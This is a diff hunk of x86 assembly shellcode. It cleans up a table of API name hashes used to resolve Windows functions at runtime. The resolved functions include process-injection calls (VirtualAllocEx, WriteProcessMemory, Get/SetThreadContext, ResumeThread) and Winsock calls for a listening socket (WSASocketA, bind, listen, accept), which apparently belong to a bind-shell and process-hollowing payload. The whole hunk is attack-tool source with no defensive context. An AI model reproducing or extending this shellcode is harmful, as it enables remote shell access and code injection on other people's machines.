@@ -173,88 +173,46 @@ _start:
         call locate_kernel32_hashes_return
         
         ; LoadLibraryA - EBP + 0x04
-        ; db 0x8E
-        ; db 0x4E
-        ; db 0x0E
         dd 0xEC0E4E8E
         
         ; CreateProcessA - EBP + 0x08
-        ; db 0x72
-        ; db 0xFE
-        ; db 0xB3
         dd 0x16B3FE72
         
         ; ExitProcess - EBP + 0x0C
-        ; db 0x7E
-        ; db 0xD8
-        ; db 0xE2
         dd 0x73E2D87E
 
 	; TerminateProcess - EBP + 0x10
-	; db 0x83
-	; db 0xB9
-	; db 0xB5
 	dd 0x78B5B983
 
 	; GetThreadContext - EBP + 0x14
-	; db 0xD2
-	; db 0xC7
-	; db 0xA7
 	dd 0x68A7C7D2
 
 	; VirtualAllocEx - EBP + 0x18
-	; db 0x9C
-	; db 0x95
-	; db 0x1A
 	dd 0x6E1A959C
 
 	; WriteProcessMemory - EBP + 0x1C
-	; db 0xA1
-	; db 0x6A
-	; db 0x3D
 	dd 0xD83D6AA1
 
 	; SetThreadContext - EBP + 0x20
-	; db 0xD3
-	; db 0xC7
-	; db 0xA7
 	dd 0xE8A7C7D3
 
 	; ResumeThread - EBP + 0x24
-	; db 0x88
-	; db 0x3F
-	; db 0x4A
 	dd 0x9E4A3F88
         
     ; locate_ws2_32_hashes:
         ; WSASocketA - EBP + 0x28
-        ; db 0xD9
-        ; db 0x09
-        ; db 0xF5
         dd 0xADF509D9
         
         ; bind - EBP + 0x2C
-        ; db 0xA4
-        ; db 0x1A
-        ; db 0x70
         dd 0xC7701AA4
         
         ; listen - EBP + 0x30
-        ; db 0xA4
-        ; db 0xAD
-        ; db 0x2E
         dd 0xE92EADA4
         
         ; accept - EBP + 0x34
-        ; db 0xE5
-        ; db 0x49
-        ; db 0x86
         dd 0x498649E5
         
         ; WSAStartup - EBP + 0x38
-        ; db 0xCB
-        ; db 0xED
-        ; db 0xFC
         dd 0x3BFCEDCB
         
     ; ======= Main
